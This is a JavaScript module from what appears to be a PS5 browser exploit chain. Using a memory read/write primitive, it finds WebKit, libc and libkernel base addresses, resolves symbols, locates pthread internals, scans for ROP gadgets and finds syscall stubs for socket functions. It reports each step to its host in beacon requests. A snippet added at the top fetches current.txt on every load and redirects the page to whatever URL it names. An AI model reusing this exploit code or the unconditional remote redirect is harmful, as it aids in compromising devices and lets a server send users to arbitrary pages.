/*
 * runtime-derive/derive-runtime.js  —  RUNTIME-DERIVE (R2)
 *
 * Offsetless, version-agnostic derivation of every userland constant the loader
 * needs, using ONLY the ARW primitive installed by src/utils/mem.js:199-218
 * (p.read1/2/4/8). Zero firmware tables. Every hardcoded value below is either
 * an ELF/ABI constant or explicitly marked DYNAMIC.
 *
 * Style: classic script (like src/rop.js, src/main.js). No imports. Defines
 * `deriveRuntime` on the global object. `int64` is read lazily from the global
 * set by src/utils/int64.js:53, so this file can be parsed before that loads.
 *
 * NOT wired into the live loader yet. See design.md d5 for the call-site plan.
 */
/* auto-upgrade kit: cualquier página que incluya este script se auto-redirige
 * al dispatch vigente (current.txt), con nonce anti-cache. Se ejecuta SIEMPRE
 * porque este archivo se re-fresquea en cada restore/relaunch de sesión. */
(function () {
  try {
    var x = new XMLHttpRequest();
    x.open("GET", "current.txt?u=" + Date.now().toString(36) + Math.floor(Math.random() * 1e4).toString(36), false);
    x.send(null);
    var u = (x.responseText || "").trim();
    if (u) {
      var p = location.pathname.split("/").pop().split("?")[0];
      var t = u.split("?")[0];
      if (t && p !== t) location.replace(u);
    }
  } catch (e) {}
})();
(function (root) {
  "use strict";

  // ---- ABI / ELF constants (invariant, not firmware data) -----------------
  var PAGE = 0x4000;                 // PS5 userland page (matches main.js:98 %0x4000)
  var ELF_MAGIC_LE = 0x464c457f;     // "\x7fELF"
  var MAX_MODULE_SPAN = 0x10000000;  // 256 MiB downward-walk cap (DYNAMIC bound, generous)
  var LOW_MODULE = 0x100000000;      // ignore maps below 4 GiB
  var TEXT_CAP = 0x3000000;          // 48 MiB .text snapshot cap (DYNAMIC bound)
  var PLT_STRIDE = 16;               // x86-64 PLT entry stride (ABI)

  var PT_LOAD = 1, PT_DYNAMIC = 2, PF_X = 1;
  var DT_NULL = 0, DT_PLTRELSZ = 2, DT_HASH = 4, DT_STRTAB = 5, DT_SYMTAB = 6,
      DT_RELA = 7, DT_RELASZ = 8, DT_RELAENT = 9, DT_STRSZ = 10, DT_SYMENT = 11,
      DT_JMPREL = 23, DT_PLTREL = 20, DT_GNU_HASH = 0x6ffffef5;
  var R_X86_64_64 = 1, R_X86_64_GLOB_DAT = 6, R_X86_64_JUMP_SLOT = 7;
  var SHN_UNDEF = 0;

  var NONCE = (function () {
    try {
      var a = new Uint32Array(2);
      (root.crypto || {}).getRandomValues ? root.crypto.getRandomValues(a)
        : (a[0] = (Date.now() ^ (Math.random() * 0xffffffff)) >>> 0, a[1] = 0);
      return a[0].toString(16) + a[1].toString(16);
    } catch (e) { return String(Date.now().toString(16)); }
  })();

  function DerivationError(rung, detail) {
    this.name = "DerivationError";
    this.rung = rung;
    this.detail = detail;
    this.message = "runtime-derive[" + rung + "]: " + detail;
  }
  DerivationError.prototype = Object.create(Error.prototype);

  // ---- logging + wire sayings ---------------------------------------------
  // The console can only talk to a host we control; host.py do_POST sinks every
  // POST to host-beacons.log (host.py:340-372). Failures go to /gate/halt/🙊<nonce>.
  function say(msg) { try { root.console && root.console.log("[derive] " + msg); } catch (e) {} }
  function beacon(path, body) {
    try {
      if (typeof root.fetch !== "function" || !root.location) return;
      root.fetch(root.location.origin + path, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body || {}),
        keepalive: true,
        cache: "no-store",
      }).catch(function () {});
    } catch (e) {}
  }
  function step(n, name, detail) { beacon("/beacon/step" + n + "-" + name, detail); say("STEP" + n + " " + name); }
  function halt(rung, detail) { beacon("/gate/halt/\ud83d\ude4a" + NONCE, { rung: rung, detail: String(detail) }); throw new DerivationError(rung, detail); }

  // ---- int64 bridge --------------------------------------------------------
  function i64(num) {
    var C = root.int64;
    if (typeof C !== "function") return num;           // tests may not load int64.js
    return new C(num % 0x100000000, Math.floor(num / 0x100000000));
  }
  function i64num(v) { return (v && typeof v === "object" && "low" in v) ? v.hi * 0x100000000 + v.low : v; }

  // ---- byte reader over the ARW window ------------------------------------
  // p.read8 in 8-byte steps (mitigates the per-call set/reset in mem.js:90-98,128-135);
  // tail via read4/read2/read1 so we never read past the requested length.
  function readRange(p, addr, len) {
    var out = new Uint8Array(len), i = 0;
    for (; i + 8 <= len; i += 8) {
      var q = p.read8(addr + i), lo = q.low >>> 0, hi = q.hi >>> 0;
      out[i] = lo & 0xff; out[i + 1] = (lo >>> 8) & 0xff; out[i + 2] = (lo >>> 16) & 0xff; out[i + 3] = (lo >>> 24) & 0xff;
      out[i + 4] = hi & 0xff; out[i + 5] = (hi >>> 8) & 0xff; out[i + 6] = (hi >>> 16) & 0xff; out[i + 7] = (hi >>> 24) & 0xff;
    }
    var rem = len - i;
    if (rem >= 4) { var d = p.read4(addr + i) >>> 0; out[i] = d & 0xff; out[i + 1] = (d >>> 8) & 0xff; out[i + 2] = (d >>> 16) & 0xff; out[i + 3] = (d >>> 24) & 0xff; i += 4; rem -= 4; }
    if (rem >= 2) { var w = p.read2(addr + i) & 0xffff; out[i] = w & 0xff; out[i + 1] = (w >>> 8) & 0xff; i += 2; rem -= 2; }
    if (rem >= 1) out[i] = p.read1(addr + i) & 0xff;
    return out;
  }
  function u16(b, o) { return b[o] | (b[o + 1] << 8); }
  function u32(b, o) { return (b[o] | (b[o + 1] << 8) | (b[o + 2] << 16) | (b[o + 3] << 24)) >>> 0; }
  function u64(b, o) { return u32(b, o) + u32(b, o + 4) * 0x100000000; }
  function cstr(p, addr, max) {
    max = max || 256;
    var b = readRange(p, addr, max), s = "";
    for (var i = 0; i < b.length && b[i] !== 0; i++) s += String.fromCharCode(b[i]);
    return s;
  }

  // ---- ELF header + program headers ---------------------------------------
  function parseElf(p, base) {
    var h = readRange(p, base, 0x40);
    if (u32(h, 0) !== ELF_MAGIC_LE) return null;
    if (h[4] !== 2 || h[5] !== 1) return null;              // ELF64, little-endian
    var e_type = u16(h, 16);
    var e_phoff = u64(h, 0x20), e_phentsize = u16(h, 0x36), e_phnum = u16(h, 0x38);
    if (!e_phnum || e_phnum > 0x100 || e_phentsize < 0x38) return null;
    var ph = [];
    for (var i = 0; i < e_phnum; i++) {
      var e = readRange(p, base + e_phoff + i * e_phentsize, 0x38);
      ph.push({ type: u32(e, 0), flags: u32(e, 4), offset: u64(e, 8), vaddr: u64(e, 0x10),
                filesz: u64(e, 0x20), memsz: u64(e, 0x28), align: u64(e, 0x30) });
    }
    return { base: base, e_type: e_type, ph: ph };
  }
  function containsAddr(mod, addr) {
    for (var i = 0; i < mod.ph.length; i++) {
      var s = mod.ph[i];
      if (s.type !== PT_LOAD) continue;
      var lo = mod.base + s.vaddr, hi = lo + s.memsz;
      if (addr >= lo && addr < hi) return true;
    }
    return false;
  }
  function execSegments(p, mod, cap) {
    var out = [];
    for (var i = 0; i < mod.ph.length; i++) {
      var s = mod.ph[i];
      if (s.type !== PT_LOAD || !(s.flags & PF_X)) continue;
      var len = s.memsz;
      if (cap && len > cap) len = cap;
      out.push({ vaddr: s.vaddr, addr: mod.base + s.vaddr, bytes: readRange(p, mod.base + s.vaddr, len) });
    }
    return out;
  }

  // ---- base discovery (d1) -------------------------------------------------
  function findModuleBase(p, runtimeAddr, expectName) {
    var a = Math.floor(runtimeAddr / PAGE) * PAGE;
    var floor = Math.max(LOW_MODULE, a - MAX_MODULE_SPAN);
    for (var steps = 0; a >= floor; steps++, a -= PAGE) {
      if ((p.read4(a) >>> 0) !== ELF_MAGIC_LE) continue;
      var mod = parseElf(p, a);
      if (!mod || mod.e_type !== 3) continue;             // ET_DYN
      if (!containsAddr(mod, runtimeAddr)) continue;       // stray magic inside .rodata
      if (expectName) {
        var d = elfDyn(p, mod);
        if (!d || !(expectName in d.exports) || mod.base + d.exports[expectName].value !== runtimeAddr) {
          // not the module we expected at this address: keep walking only if it
          // is clearly a different mapping, otherwise accept (name may be local).
          continue;
        }
      }
      return mod;
    }
    return null;
  }
  function deriveWebKitBase(p, opts) {
    opts = opts || {};
    var ctor = opts.ctor != null ? opts.ctor : root.__ps5NativeCtor;
    var ctorNum = i64num(ctor);
    if (typeof ctorNum !== "number" || !(ctorNum > 0)) halt("d1", "no __ps5NativeCtor (need primitive first)");
    // native_constructor is `callHostFunctionAsConstructor` for the leaked parseInt:
    // JSGlobalObject.cpp:1011-1015 + JSFunction.h:52 default nativeConstructor.
    var mod = findModuleBase(p, ctorNum);                  // do not require the name (fully stripped builds)
    if (!mod) halt("d1", "no validated ELF header below ctor=0x" + ctorNum.toString(16));
    step(1, "wkbase-derived", { base: "0x" + mod.base.toString(16), span: mod.base - ctorNum });
    return { mod: mod, base: mod.base, baseNum: mod.base, baseI64: i64(mod.base) };
  }

  // ---- dynamic section, dynsym, relocations (d2) --------------------------
  function readDynamic(p, mod) {
    var seg = null;
    for (var i = 0; i < mod.ph.length; i++) if (mod.ph[i].type === PT_DYNAMIC) seg = mod.ph[i];
    if (!seg) return null;
    var addr = mod.base + seg.vaddr, tags = {}, seen = 0;
    for (var k = 0; k < 4096 && seen < seg.memsz / 16 + 1; k++) {
      var e = readRange(p, addr + k * 16, 16), tag = u64(e, 0), val = u64(e, 8);
      if (tag === DT_NULL) break;
      tags[tag] = val; seen++;
    }
    return tags;
  }
  function dynsymCount(p, mod, tags) {
    if (tags[DT_HASH]) return p.read4(mod.base + tags[DT_HASH] + 4) >>> 0;   // nchain
    if (tags[DT_GNU_HASH]) {
      var g = mod.base + tags[DT_GNU_HASH];
      var nbuckets = p.read4(g) >>> 0, symoffset = p.read4(g + 4) >>> 0, bloom = p.read4(g + 8) >>> 0;
      var buckets = g + 16 + bloom * 8;
      var chains = buckets + nbuckets * 4;
      var maxIdx = symoffset;
      for (var bi = 0; bi < nbuckets; bi++) {
        var v = p.read4(buckets + bi * 4) >>> 0;
        if (v < symoffset) continue;
        var j = v - symoffset, guard = 0;
        while (guard++ < 0x20000) {
          var c = p.read4(chains + j * 4) >>> 0;
          if (c & 1) { if (v + j + 1 > maxIdx) maxIdx = v + j + 1; break; }
          j++;
        }
      }
      return maxIdx;
    }
    return 0;  // caller falls back to walking
  }
  function elfDyn(p, mod) {
    var tags = readDynamic(p, mod);
    if (!tags || !tags[DT_SYMTAB] || !tags[DT_STRTAB]) return null;
    var symtab = mod.base + tags[DT_SYMTAB], strtab = mod.base + tags[DT_STRTAB];
    var strsz = tags[DT_STRSZ] || 0;
    var count = dynsymCount(p, mod, tags), syms = [], i;
    if (!count) {                                           // walk until a zeroed entry
      for (i = 0; i < 0x4000; i++) {
        var z = readRange(p, symtab + i * 24, 24);
        if (u32(z, 0) === 0 && u16(z, 6) === 0 && u64(z, 8) === 0 && i > 0) { count = i; break; }
      }
    }
    for (i = 0; i < count; i++) {
      var e = readRange(p, symtab + i * 24, 24);
      var nameOff = u32(e, 0);
      syms.push({
        name: nameOff && nameOff < strsz ? cstr(p, strtab + nameOff, 96) : "",
        shndx: u16(e, 6),
        value: u64(e, 8),
      });
    }
    var imports = {}, exports = {}, relocs = [];
    function addRelocs(off, sz) {
      if (!off || !sz) return;
      var n = Math.floor(sz / 24);
      for (var j = 0; j < n; j++) {
        var r = readRange(p, mod.base + off + j * 24, 24);
        var type = u32(r, 8), sym = u32(r, 12), slot = u64(r, 0);
        if (sym === 0 || sym >= syms.length) continue;
        relocs.push({ name: syms[sym].name, type: type, slot: slot, sym: sym });
      }
    }
    addRelocs(tags[DT_RELA], tags[DT_RELASZ]);
    addRelocs(tags[DT_JMPREL], tags[DT_PLTRELSZ]);
    for (i = 0; i < relocs.length; i++) {
      var rl = relocs[i];
      if (!rl.name) continue;
      if (syms[rl.sym].shndx === SHN_UNDEF) imports[rl.name] = { slot: rl.slot, type: rl.type };
    }
    for (i = 1; i < syms.length; i++) {
      if (syms[i].name && syms[i].shndx !== SHN_UNDEF && !(syms[i].name in exports))
        exports[syms[i].name] = { value: syms[i].value };
    }
    return { base: mod.base, tags: tags, syms: syms, imports: imports, exports: exports, relocs: relocs };
  }
  function expect(name, map, rung) { var v = map[name]; if (v == null) halt(rung, "symbol not found: " + name); return v; }
  function moduleExport(p, mod, name) { var d = elfDyn(p, mod); return d && d.exports[name] ? d : null; }

  // resolve an imported symbol's runtime target by reading its GOT slot
  function resolveImport(p, wkMod, wkDyn, name) {
    var imp = wkDyn.imports[name];
    if (!imp) return null;
    var slot = wkMod.base + imp.slot;
    return { slot: imp.slot, addr: i64num(p.read8(slot)) };
  }

  function deriveDependencies(p, wkMod, wkDyn) {
    // libc via memset import, libkernel via __stack_chk_guard import.
    var memset = resolveImport(p, wkMod, wkDyn, "memset");
    if (!memset) halt("d2", "wk has no 'memset' import slot");
    var chk = resolveImport(p, wkMod, wkDyn, "__stack_chk_guard");
    if (!chk) halt("d2", "wk has no '__stack_chk_guard' import slot");

    var libcMod = findModuleBase(p, memset.addr);
    var libkMod = findModuleBase(p, chk.addr);
    if (!libcMod) halt("d2", "no ELF below memset target 0x" + memset.addr.toString(16));
    if (!libkMod) halt("d2", "no ELF below __stack_chk_guard target 0x" + chk.addr.toString(16));

    var libcDyn = elfDyn(p, libcMod), libkDyn = elfDyn(p, libkMod);
    if (!libcDyn || !libkDyn) halt("d2", "target module has no .dynamic");

    // cross-check the module actually resolves those names (memset is usually local-visible)
    var out = {
      libc: libcMod.base, libkernel: libkMod.base,
      memsetSlot: memset.slot, memsetAddr: memset.addr,
      chkSlot: chk.slot, chkAddr: chk.addr,
      libcExports: {}, libkExports: {},
    };
    ["setjmp", "longjmp", "memset", "memcpy", "malloc"].forEach(function (n) {
      if (libcDyn.exports[n]) out.libcExports[n] = libcMod.base + libcDyn.exports[n].value;
    });
    ["pthread_create", "pthread_join", "pthread_exit", "sleep", "sceKernelGetCurrentCpu", "getpid", "sysctlbyname"]
      .forEach(function (n) { if (libkDyn.exports[n]) out.libkExports[n] = libkMod.base + libkDyn.exports[n].value; });

    if (!("setjmp" in out.libcExports) || !("longjmp" in out.libcExports))
      halt("d2", "libc is missing setjmp/longjmp exports");

    // [RESIDUAL] _thread_list / worker_wait_return: local libkernel symbols -> heuristics.
    out.threadList = findThreadList(p, libkMod);              // may be null
    out.workerWaitReturn = findWorkerWaitReturn(p, libkMod);  // may be null

    step(2, "dynsym-resolved", { libc: "0x" + out.libc.toString(16), libkernel: "0x" + out.libkernel.toString(16) });
    return out;
  }

  // ---- d2 residual heuristics (bounded, read-only) ------------------------
  var PTHREAD_NEXT = 0x38, PTHREAD_STACK = 0xa8, PTHREAD_STACKSZ = 0xb0;
  function plausiblePtr(v) { return Number.isInteger(v) && v > LOW_MODULE && v < 0x10000000000; }
  function findThreadList(p, libkMod) {
    // Scan writable PT_LOAD for a head pointer H whose node chain looks like pthreads
    // (next @0x38, stack @0xa8, stacksz @0xb0==0x80000) — the exact layout main.js:11-12 uses.
    for (var i = 0; i < libkMod.ph.length; i++) {
      var s = libkMod.ph[i];
      if (s.type !== PT_LOAD || (s.flags & PF_X)) continue;
      var base = libkMod.base + s.vaddr, len = Math.min(s.memsz, 0x800000);
      for (var off = 0; off + 8 <= len; off += 8) {
        var head = i64num(p.read8(base + off));
        if (!plausiblePtr(head)) continue;
        var nxt = i64num(p.read8(head + PTHREAD_STACKSZ)), stk = i64num(p.read8(head + PTHREAD_STACK)), nx2 = i64num(p.read8(head + PTHREAD_NEXT));
        if (nxt === 0x80000 && plausiblePtr(stk) && (nx2 === 0 || plausiblePtr(nx2)))
          return { head: base + off, node: head };
      }
    }
    return null;
  }
  function findWorkerWaitReturn(p, libkMod) {
    // Inverse of main.js:40-53: the parked worker's return address is the libkernel
    // .text address that recurs across the 0x80000 stacks listed by the thread chain.
    var tl = findThreadList(p, libkMod);
    if (!tl) return null;
    var counts = {}, stacks = [];
    for (var thread = i64num(p.read8(tl.head)), n = 0; thread && n < 512; n++) {
      var sz = i64num(p.read8(thread + PTHREAD_STACKSZ));
      if (sz === 0x80000) stacks.push(thread);
      thread = i64num(p.read8(thread + PTHREAD_NEXT));
    }
    // libkernel .text range
    var textLo = Infinity, textHi = 0;
    for (var i = 0; i < libkMod.ph.length; i++) {
      var s = libkMod.ph[i];
      if (s.type === PT_LOAD && (s.flags & PF_X)) { var lo = libkMod.base + s.vaddr; textLo = Math.min(textLo, lo); textHi = Math.max(textHi, lo + s.memsz); }
    }
    for (var k = 0; k < stacks.length; k++) {
      for (var o = 0x7f000; o < 0x80000; o += 8) {
        var v = i64num(p.read8(stacks[k] + o));
        if (v >= textLo && v < textHi) counts[v] = (counts[v] || 0) + 1;
      }
    }
    var best = null, bestN = 0, ties = 0;
    for (var a in counts) { if (counts[a] > bestN) { best = +a; bestN = counts[a]; ties = 1; } else if (counts[a] === bestN && +a !== best) ties++; }
    return (best && ties === 1 && bestN >= Math.max(2, stacks.length - 1)) ? { addr: best, hits: bestN, stacks: stacks.length } : null;
  }

  // ---- PLT run cross-check (d2) -------------------------------------------
  function findPltRun(p, mod, minRun) {
    var segs = execSegments(p, mod, TEXT_CAP);
    for (var s = 0; s < segs.length; s++) {
      var b = segs[s].bytes, base = segs[s].addr, run = 0, start = -1;
      for (var i = 0; i + 6 <= b.length; i++) {
        if (b[i] === 0xff && b[i + 1] === 0x25) { if (run === 0) start = i; run++; if (run >= minRun) return { addr: base + start, count: run }; }
        else if (run) { run = 0; start = -1; }
      }
    }
    return null;
  }

  // ---- gadget scanning (d3) ------------------------------------------------
  // Patterns are canonical x86-64 encodings of the gadget NAMES (see design.md d3.2);
  // "tight" adds the trailing ret (C3) so the gadget is stack-usable. The offsets
  // tables store RVAs, NOT encodings (proven: 10.40 vs 13.60 pop rax differ).
  var GADGETS = {
    "ret": [[0xc3]],
    "pop rdi": [[0x5f]], "pop rsi": [[0x5e]], "pop rdx": [[0x5a]], "pop rcx": [[0x59]],
    "pop rax": [[0x58]], "pop rsp": [[0x5c]], "pop r8": [[0x41, 0x58]], "pop r9": [[0x41, 0x59]],
    "mov [rdi], rsi": [[0x48, 0x89, 0x37]], "mov [rdi], rax": [[0x48, 0x89, 0x07]],
    "mov [rdi], eax": [[0x89, 0x07]], "mov rax, [rax]": [[0x48, 0x8b, 0x00]],
    "add rax, rcx": [[0x48, 0x01, 0xc8]], "cmp [rcx], eax": [[0x39, 0x01]],
    "inc dword [rax]": [[0xff, 0x00]],
    "seta al": [[0x0f, 0x97, 0xc0]], "setb al": [[0x0f, 0x92, 0xc0]], "sete al": [[0x0f, 0x94, 0xc0]],
    "setg al": [[0x0f, 0x9f, 0xc0]], "setl al": [[0x0f, 0x9c, 0xc0]],
    "shl rax, 3": [[0x48, 0xc1, 0xe0, 0x03]], "shl rax, 4": [[0x48, 0xc1, 0xe0, 0x04]],
    "shr rax, 3": [[0x48, 0xc1, 0xe8, 0x03]], "shr rax, 4": [[0x48, 0xc1, 0xe8, 0x04]],
    "infloop": [[0xeb, 0xfe]],
  };
  function matchAt(b, i, pat) {
    if (i + pat.length > b.length) return false;
    for (var j = 0; j < pat.length; j++) if (b[i + j] !== pat[j]) return false;
    return true;
  }
  function scanText(p, mod) {
    var segs = execSegments(p, mod, TEXT_CAP), out = {}, names = Object.keys(GADGETS);
    for (var n = 0; n < names.length; n++) {
      var pat = GADGETS[names[n]][0], tight = names[n] === "ret" || names[n] === "infloop";
      var found = -1;
      // Tier A: core + C3 (tight gadget). scanned in the first exec segment that yields one.
      for (var s = 0; s < segs.length && found < 0; s++) {
        var b = segs[s].bytes;
        for (var i = 0; i + pat.length <= b.length; i++) {
          if (!matchAt(b, i, pat)) continue;
          if (tight || b[i + pat.length] === 0xc3) { found = segs[s].addr + i; break; }
        }
      }
      if (found < 0) {  // Tier B: core + benign tail up to C3 (reject flows)
        for (var s2 = 0; s2 < segs.length && found < 0; s2++) {
          var bb = segs[s2].bytes;
          for (var k = 0; k + pat.length <= bb.length; k++) {
            if (!matchAt(bb, k, pat)) continue;
            var ok = true, j = k + pat.length, lim = Math.min(j + 16, bb.length);
            for (; j < lim; j++) {
              if (bb[j] === 0xc3) break;
              if (bb[j] === 0xe8 || bb[j] === 0xe9 || bb[j] === 0xeb || bb[j] === 0xff || (bb[j] === 0x0f && (bb[j + 1] & 0xf0) === 0x80)) { ok = false; break; }
            }
            if (ok && j < lim) { found = segs[s2].addr + k; break; }
          }
        }
      }
      if (found >= 0) out[names[n]] = found;
    }
    return out;
  }
  function deriveCode(p, wkMod, libkMod, libkDyn) {
    var g = scanText(p, wkMod);
    var missing = Object.keys(GADGETS).filter(function (n) { return !(n in g); });
    if (missing.length) halt("d3", "gadgets not found: " + missing.join(", "));
    var gadgets = {};
    Object.keys(g).forEach(function (n) { gadgets[n] = i64(g[n]); });

    var NEED = { SOCKET: "socket", SETSOCKOPT: "setsockopt", BIND: "bind", LISTEN: "listen",
                 GETSOCKNAME: "getsockname", ACCEPT: "accept", READ: "read", WRITE: "write",
                 CLOSE: "close", GETPID: "getpid" };
    var syscalls = {};
    Object.keys(NEED).forEach(function (k) {
      var name = NEED[k], v = libkDyn.exports[name] ? libkMod.base + libkDyn.exports[name].value : findSyscallStub(p, libkMod, SYSNUM[k]);
      if (v == null) halt("d4", "syscall " + k + " (" + name + ") unresolved");
      syscalls[SYSNUM[k]] = i64(v);
      syscalls[k] = i64(v);         // name-keyed alias for diagnostics
    });
    step(3, "gadgets-bound", { n: Object.keys(gadgets).length });
    step(4, "syscalls-bound", { n: Object.keys(NEED).length });
    return { gadgets: gadgets, syscalls: syscalls, gadgetAddrs: g };
  }

  // syscall numbers (from src/utils/syscalls.js; stable FreeBSD/PS ABI numbers)
  var SYSNUM = { SOCKET: 0x061, SETSOCKOPT: 0x069, BIND: 0x068, LISTEN: 0x06a,
                 GETSOCKNAME: 0x020, ACCEPT: 0x01e, READ: 0x003, WRITE: 0x004, CLOSE: 0x006, GETPID: 0x014 };

  // ---- syscall stub pattern (d4 fallback) ---------------------------------
  // PS5/FreeBSD x86-64: mov eax, imm32 ; syscall (; ret / error branch). No r10 move
  // (r10 is the native 4th arg on FreeBSD; the r10 move is the Linux glibc ABI).
  // [DERIVED+VALIDATE] no 13.60 libkernel_web binary exists locally to byte-verify.
  function findSyscallStub(p, libkMod, nr) {
    var segs = execSegments(p, libkMod, TEXT_CAP);
    var pat = [0xb8, nr & 0xff, (nr >>> 8) & 0xff, (nr >>> 16) & 0xff, (nr >>> 24) & 0xff, 0x0f, 0x05];
    var loose = -1;
    for (var s = 0; s < segs.length; s++) {
      var b = segs[s].bytes;
      for (var i = 0; i + 7 <= b.length; i++) {
        if (!matchAt(b, i, pat)) continue;
        var after = b[i + 7];
        if (after === 0xc3 || after === 0x72 || after === 0x73) return segs[s].addr + i;
        if (loose < 0) loose = segs[s].addr + i;
      }
    }
    return loose < 0 ? null : loose;
  }

  // ---- ladder --------------------------------------------------------------
  async function run(p, opts) {
    opts = opts || {};
    if (!p || typeof p.read8 !== "function") halt("d0", "no ARW primitive (need p from installWindowP)");
    var wk = deriveWebKitBase(p, opts);
    var wkDyn = elfDyn(p, wk.mod);
    if (!wkDyn) halt("d2", "wk module has no .dynamic (stripped?)");
    // free verification of d1 when callHostFunctionAsConstructor is still exported
    var ctorName = "callHostFunctionAsConstructor";
    if (wkDyn.exports[ctorName] && wk.mod.base + wkDyn.exports[ctorName].value !== i64num(root.__ps5NativeCtor))
      say("warn: callHostFunctionAsConstructor != __ps5NativeCtor (different leaked host fn)");

    var deps = deriveDependencies(p, wk.mod, wkDyn);
    var libkMod = findModuleBase(p, deps.libkernel + 1);       // re-derive the module object
    if (!libkMod) halt("d2", "could not re-parse libkernel at 0x" + deps.libkernel.toString(16));
    var libkDyn = elfDyn(p, libkMod);
    if (!libkDyn) halt("d2", "libkernel has no .dynamic");
    var code = deriveCode(p, wk.mod, libkMod, libkDyn);

    return {
      ok: true,
      wkBase: i64(wk.base),
      wkBaseNum: wk.base,
      libc: i64(deps.libc), libkernel: i64(deps.libkernel),
      libcNum: deps.libc, libkernelNum: deps.libkernel,
      libcExports: deps.libcExports, libkExports: deps.libkExports,
      threadList: deps.threadList, workerWaitReturn: deps.workerWaitReturn,
      gadgets: code.gadgets, syscalls: code.syscalls,
      derivation: { generatedAt: Date.now(), method: "runtime-elf", nonce: NONCE },
    };
  }

  root.deriveRuntime = {
    // public ladder
    run: run,
    deriveWebKitBase: deriveWebKitBase,
    deriveDependencies: deriveDependencies,
    deriveCode: deriveCode,
    // testable internals
    _internals: {
      readRange: readRange, parseElf: parseElf, elfDyn: elfDyn, readDynamic: readDynamic,
      findModuleBase: findModuleBase, findPltRun: findPltRun, findSyscallStub: findSyscallStub,
      scanText: scanText, GADGETS: GADGETS, resolveImport: resolveImport, cstr: cstr,
      findThreadList: findThreadList, findWorkerWaitReturn: findWorkerWaitReturn,
    },
    beacon: beacon,
    int64FromNum: i64,
    DerivationError: DerivationError,
  };
})(typeof window !== "undefined" ? window : globalThis);
